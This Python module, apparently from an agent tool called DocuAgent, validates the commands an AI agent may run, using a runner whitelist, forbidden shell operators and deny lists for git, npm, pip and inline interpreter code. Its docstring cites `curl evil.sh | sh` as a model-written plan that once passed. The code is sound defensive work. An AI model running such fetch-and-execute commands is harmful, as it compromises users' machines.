"""The single source of truth for which external commands DocuAgent may run.

Two paths execute subprocesses on the user's machine: the interactive terminal and
task verification. The terminal was already gated by a whitelist; verification was
not — it ran `shlex.split(<any string>)` straight from the task plan, and the task
plan is written by the model. The one check that existed (agent_tools requiring the
command to appear in `task["verification"]`) did not help, because that list is
itself model-authored: a plan declaring `curl evil.sh | sh` satisfied it.

`shell=False` already prevented pipe/redirect injection — `|` arrives as a literal
argument, not a shell operator — so this was not a directly exploitable hole. What
was missing is the first token: any executable on PATH could be named. This module
fixes the runner to a known set and parameterizes the rest.

Both callers share these rules, so the terminal and verification cannot drift apart.
"""

from __future__ import annotations

import os
import ntpath
import shlex
import sys

from core import WorkspaceError

# Interpreters and package/VCS tools a project legitimately needs to verify itself.
# Deliberately not configurable from a project file or a model response: a whitelist
# an untrusted input can extend is not a whitelist.
ALLOWED_COMMANDS = frozenset({
    "python",
    "python3",
    "pytest",
    "npm",
    "npm.cmd",
    "npx",
    "npx.cmd",
    "node",
    "git",
    "pip",
    "pip3",
})

# Shell metacharacters. Rejected even though `shell=False` neutralizes them, so that a
# command meaning something other than what it reads as never reaches a subprocess.
FORBIDDEN_MARKERS = ("&&", "||", ";", "|", ">", "<", "`", "$(")


def split_command(command: str) -> list[str]:
    """Split a command line into argv, correctly on Windows as well as POSIX.

    `shlex.split` defaults to POSIX rules, where the backslash is an escape character.
    On Windows it is the path separator, so
    `C:\\Program Files\\Python312\\python.exe -c "print(1)"` split to
    `['C:Program', 'FilesPython312python.exe', ...]` — the separators were eaten, the
    executable did not exist, and `subprocess` raised FileNotFoundError. Callers caught
    that and reported returncode -1, which read like "the environment killed the child"
    and was recorded as a sandbox quirk. It was neither: any interpreter installed under
    a path containing a space (the default `C:\\Program Files\\...`) could not be used as
    a verification command at all.

    On Windows, parse with `posix=False` so backslashes survive, then strip the surrounding
    quotes that mode leaves attached. Elsewhere, POSIX rules are correct and are kept.
    """
    if os.name != "nt":
        return shlex.split(command)
    parts = shlex.split(command, posix=False)
    unquoted: list[str] = []
    for part in parts:
        if len(part) >= 2 and part[0] == part[-1] and part[0] in ("\"", "'"):
            part = part[1:-1]
        unquoted.append(part)
    return unquoted


def _is_path_like(token: str) -> bool:
    return os.sep in token or bool(os.altsep and os.altsep in token)


def _runner_allowed(argv: list[str]) -> bool:
    """Whether `argv` starts with a permitted runner.

    A bare name must be on the whitelist. A path is allowed only when it *is* the
    running interpreter: `sys.executable` is the correct way for a plan to invoke
    "the same Python that runs DocuAgent", and rejecting it would push plans toward
    the bare `python` on PATH, which may be a different environment. Matching on
    basename instead would defeat the check, since any binary can be named python.exe.

    An unquoted interpreter path containing a space arrives here as several tokens
    (`C:\\Program`, `Files\\...\\python.exe`, ...). Windows re-joins argv and resolves
    that back to the real executable, so refusing it would reject a command the OS
    runs correctly; instead, rejoin the leading tokens and compare the result.
    """
    token = argv[0]
    if _is_path_like(token):
        candidates = [token]
        if os.name == "nt":
            joined = token
            for extra in argv[1:]:
                joined = f"{joined} {extra}"
                candidates.append(joined)
                if _looks_executable(joined):
                    break
        for candidate in candidates:
            try:
                if os.path.realpath(candidate) == os.path.realpath(sys.executable):
                    return True
            except (OSError, ValueError):
                continue
        return False
    name = token.lower()
    if name.endswith(".exe"):
        name = name[: -len(".exe")]
    return name in ALLOWED_COMMANDS or token in ALLOWED_COMMANDS


def _looks_executable(value: str) -> bool:
    return value.lower().endswith((".exe", ".cmd", ".bat", ".com"))


def _is_absolute_path(token: str) -> bool:
    """Recognize both host-native and Windows absolute paths."""
    return os.path.isabs(token) or ntpath.isabs(token)


def _validate_argument_safety(argv: list[str], *, context: str) -> None:
    """Apply parameter-level restrictions to model-authored commands.

    `cwd` alone is not a sandbox: interpreters, package managers, and VCS tools can
    target arbitrary paths or mutate the repository. Keep the policy explicit and
    deterministic so terminal and verification callers share the same boundary.
    """
    runner = os.path.basename(argv[0]).lower()
    if runner.endswith(".exe"):
        runner = runner[:-4]

    if runner in {"python", "python3"}:
        for index, token in enumerate(argv[1:], start=1):
            if context == "验证" and (token == "-c" or token.startswith("-c")):
                raise WorkspaceError(f"{context}禁止使用 Python `-c` 执行内联代码。")
            if token == "-m" and index + 1 < len(argv):
                module = argv[index + 1].lower()
                if module in {"pip", "pip3", "ensurepip", "venv", "virtualenv"}:
                    raise WorkspaceError(f"{context}禁止使用 Python 模块 `{module}`。")

    if runner in {"node", "nodejs"} and context == "验证":
        if any(token in {"-e", "--eval", "-p", "--print"} for token in argv[1:]):
            raise WorkspaceError(f"{context}禁止使用 Node 内联代码参数。")

    if runner == "pip" or runner == "pip3":
        subcommand = next((item.lower() for item in argv[1:] if not item.startswith("-")), "")
        if subcommand not in {"", "--version", "-v", "list", "show", "check", "freeze"}:
            raise WorkspaceError(f"{context}禁止执行 pip 子命令 `{subcommand}`。")

    if runner in {"npm", "npx"}:
        if runner == "npx" and "--no-install" not in argv[1:]:
            raise WorkspaceError(f"{context}禁止 npx 联网解析或安装包，请使用 `--no-install`。")
        subcommand = next((item.lower() for item in argv[1:] if not item.startswith("-")), "")
        if subcommand in {"install", "i", "ci", "update", "uninstall", "remove", "publish", "pack", "init", "config", "link"}:
            raise WorkspaceError(f"{context}禁止执行会修改依赖或项目配置的 npm 子命令 `{subcommand}`。")

    if runner == "git":
        if any(token == "-c" or token.startswith("-c") or token.startswith("--config") for token in argv[1:]):
            raise WorkspaceError(f"{context}禁止通过 git 配置参数注入外部命令。")
        subcommand = next((item.lower() for item in argv[1:] if not item.startswith("-")), "")
        if subcommand in {
            "add", "branch", "checkout", "clean", "clone", "commit", "config", "fetch",
            "init", "merge", "mv", "pull", "push", "rebase", "remote", "reset", "restore",
            "rm", "stash", "switch", "tag", "update-ref", "worktree",
        }:
            raise WorkspaceError(f"{context}禁止执行会修改仓库或工作区的 git 子命令 `{subcommand}`。")

    for token in argv[1:]:
        candidates = [token]
        if "=" in token:
            candidates.append(token.split("=", 1)[1])
        for candidate in candidates:
            if _is_absolute_path(candidate):
                raise WorkspaceError(f"{context}参数 `{token}` 不能使用绝对路径。")
            if ".." in candidate.replace("\\", "/").split("/"):
                raise WorkspaceError(f"{context}参数 `{token}` 不能越出项目工作目录。")


def validate_command(command: str, *, context: str = "终端") -> list[str]:
    """Return the argv for `command`, or raise `WorkspaceError` explaining the refusal.

    `context` names the caller ("终端" / "验证") so the message tells the user which
    path refused the command.
    """
    command = command.strip()
    if not command:
        raise WorkspaceError("缺少命令。")
    if any(marker in command for marker in FORBIDDEN_MARKERS):
        raise WorkspaceError(
            f"{context}只允许单条白名单命令，不支持管道、重定向或命令拼接。"
        )
    try:
        parts = split_command(command)
    except ValueError as exc:
        raise WorkspaceError(f"命令格式无效：{exc}") from exc
    if not parts or not _runner_allowed(parts):
        name = parts[0] if parts else command
        raise WorkspaceError(
            f"命令 `{name}` 不在{context}白名单中。"
            f"允许的命令：{'、'.join(sorted(ALLOWED_COMMANDS))}。"
        )
    _validate_argument_safety(parts, context=context)
    return parts


def validate_verification_command(command: str) -> list[str]:
    """`validate_command` for the verification path, where commands come from a plan
    the model wrote and must therefore be treated as untrusted input."""
    return validate_command(command, context="验证")
